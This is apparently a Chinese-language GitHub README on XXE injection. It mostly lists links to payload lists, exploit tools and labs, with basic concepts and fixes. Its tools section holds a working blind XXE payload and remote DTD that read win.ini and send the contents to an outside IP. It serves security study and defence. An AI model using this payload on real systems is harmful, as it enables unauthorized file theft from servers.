# 《深入理解WEB漏洞之XXE漏洞》

本项目用来收集整理XXE漏洞的相关内容，包括XXE的利用方法工具或思路等。XXE漏洞往往不可以执行命令，但可以通过文件读取方法获取敏感信息，之后进一步Getshell！作者：[0e0w](https://github.com/0e0w)

本项目创建于2022年3月3日，最近的一次更新时间为2022年5月18日。本项目会持续更新，直到海枯石烂！

- [01-XXE漏洞资源]()
- [02-XXE漏洞基础]()
- [03-XXE漏洞工具]()
- [04-XXE渗透测试]()
- [05-XXE代码审计]()
- [06-XXE漏洞赏金]()
- [07-XXE漏洞修复]()

## 01-XXE漏洞资源

- https://github.com/topics/XXE
- https://github.com/topics/XXE
- https://github.com/search?q=XXE

一、XXE书籍资源

二、XXE培训演讲

三、XXE其他资源
- https://github.com/payloadbox/xxe-injection-payload-list
- https://github.com/omurugur/XXE_Payload_List
- https://github.com/trapp3rhat/XXE-injections
- https://github.com/HLOverflow/XXE-study
- https://github.com/deanf1/dotnet-security-unit-tests
- https://github.com/OlivierLaflamme/Auditing-Vulnerabilities
- https://github.com/samuel-knutson/dotnet-xxe-learning-tests
- https://github.com/hannoch/python-xxe
- https://github.com/mrpinghe/xxe-file-enum
- https://github.com/mprechtl/information-leakage
- https://github.com/rootz491/xxe-castor
- https://github.com/FrancescoDiSalesGithub/XXE-gen
- https://github.com/omurugur/Oracle_CTF_Web_XML_Entity_Exploit
- https://github.com/Wh1t3Fox/xxe.page
- https://github.com/magnus-longva-bouvet/xxe-demo
- https://github.com/yeeyeeweb/XXEER
- https://github.com/BuffaloWill/oxml_xxe
- https://github.com/TheTwitchy/xxer
- https://github.com/staaldraad/xxeserv
- https://github.com/AonCyberLabs/xxe-recursive-download
- https://github.com/joernchen/xxeserve
- https://github.com/ssexxe/XXEBugFind
- https://github.com/hackping/XXEpayload
- https://github.com/GoSecure/xxe-workshop
- https://github.com/ropnop/xxetimes
- https://github.com/Gifts/XXE-OOB-Exploitation-Toolset-for-Automation
- https://github.com/muttiopenbts/kisskissie
- https://github.com/SpiderMate/B-XSSRF
- https://github.com/vulnspy/phpaudit-XXE
- https://github.com/RihaMaheshwari/XXE-Injection-Payloads
- https://github.com/lc/230-OOB
- https://github.com/D4Vinci/XOE
- https://github.com/LandGrey/xxe-ftp-server
- https://github.com/vp777/metahttp
- https://github.com/incredibleindishell/XXE_Vulnerable_codes
- https://github.com/tjcim/xxefr
- https://github.com/sry309/XXE-Payload
- https://github.com/keven1z/XXEDemo
- https://github.com/Maskhe/xxeDemo
- https://github.com/d1y1n/xxetester
- https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- https://hdivsecurity.com/owasp-xml-external-entities-xxe
- https://vk9-sec.com/xml-external-entity-xxe-injection
- https://www.secpulse.com/archives/178950.html
- https://www.freebuf.com/articles/web/332419.html

## 02-XXE漏洞基础

一、XXE漏洞概念（XML External Entity Injection）

- 什么是XML？

  - XML由3个部分构成，它们分别是：文档类型定义（Document Type Definition，DTD），即XML的布局语言；可扩展的样式语言（Extensible Style Language，XSL），即XML的样式表语言；以及可扩展链接语言（Extensible Link Language，XLL）。

- 四种实体？

  - **内置实体**
    
    | 实体 | 实体引用 | 含义              |
    | ---- | -------- | ----------------- |
    | lt   | &lt;     | <（小于号）       |
    | gt   | &gt;     | >（大于号）       |
    | amp  | &amp;    | &（“and”符）      |
    | apos | &apos;   | '（撇号或单引号） |
  | quot | &quot;   | "（双引号）       |
    
  - **字符实体**
  - **通用实体**
  - **参数实体**

- 什么是XXE漏洞？

  - XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。.

- XXE漏洞分类？
  - OOB XXE：有回显
  - Blind XXE：无回显

三、XXE漏洞原理

四、XXE漏洞危害

五、XXE漏洞思考

- XXE漏洞如何执行系统命令？
- Blind XXE 如何读取敏感文件？
- XXE漏洞最大可以读取多少字节的文件？

## 03-XXE漏洞工具

- 如何开发一个XXE渗透测试和代码审计的工具？

一、XXE payload

- Blind XXE 读取文件

```
<?xml version="1.0" ?>
<!DOCTYPE any[
<!ENTITY % file SYSTEM "file://c://Windows//win.ini">
<!ENTITY % remote SYSTEM "http://10.126.168.53/h.dtd">
%remote;
%send;
]>
<foo></foo>
```

```
// 在服务器中创建此文件，文件名称为h.dtd。通过日志查看读取到的文件内容
<!ENTITY % ppp "<!ENTITY &#x25; send SYSTEM 'http://10.126.168.53/?ccc=%file;'>">
%ppp;
```

二、XXE被动扫描

三、待整理
- https://github.com/GoSecure/dtd-finder
- https://github.com/luisfontes19/xxexploiter
- https://github.com/enjoiz/XXEinjector
- https://github.com/suanve/xxeserver
- https://github.com/whitel1st/docem

## 04-XXE渗透测试

一、XXE漏洞挖掘

- 如何挖掘XXE漏洞？
- XXE漏洞经常出现的位置？

二、XXE漏洞实战

- 

三、XXE高级利用

## 05-XXE代码审计

一、XXE漏洞靶场

- https://github.com/c0ny1/xxe-lab
- https://github.com/keven1z/XXEDemo
- https://github.com/jbarone/xxelab
- https://github.com/brandonprry/vulnerable_xxe
- https://github.com/TheTwitchy/vulnd_xxe
- https://github.com/eileencodes/security_examples

二、XXE审计原理

三、XXE危险函数

- 在PHP中：
- 在Java中：
- 在.NET中：

四、XXE漏洞分析

- https://github.com/jas502n/CVE-2019-2888
- https://github.com/jamieparfet/Apache-OFBiz-XXE
- https://github.com/Wfzsec/Weblogic-XXE-poc

## 06-XXE漏洞赏金

- https://github.com/HoneTeam/XXE

## 07-XXE漏洞修复

- 方案一：使用开发语言提供的禁用外部实体的方法
  - PHP：
    1. libxml_disable_entity_loader设置为TRUE来禁用外部实体
  - Java：
    1. DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
    2. dbf.setExpandEntityReferences(false);
  - Python：
    1. from lxml import etree
    2. xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
- 方案二：过滤用户提交的XML数据
  - 过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC。

## 08-XXE参考资源

- https://github.com/ASTTeam/XXE